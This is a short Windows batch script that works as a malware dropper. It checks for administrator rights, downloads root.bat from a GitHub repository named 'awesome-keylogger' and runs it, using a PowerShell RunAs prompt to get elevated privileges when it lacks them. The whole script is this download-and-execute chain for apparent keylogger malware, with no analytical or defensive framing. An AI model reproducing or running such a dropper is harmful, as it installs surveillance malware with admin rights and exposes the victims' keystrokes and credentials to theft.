@echo off
net session >null 2>&1
IF %ERRORLEVEL% == 0 (
  curl -O https://raw.githubusercontent.com/dGgzajNzdDNy/awesome-keylogger/refs/heads/main/root.bat
  root.bat
) ELSE (
  curl -O https://raw.githubusercontent.com/dGgzajNzdDNy/awesome-keylogger/refs/heads/main/root.bat
  powershell -Command "Start-Process root.bat -Verb RunAs"
  exit
)
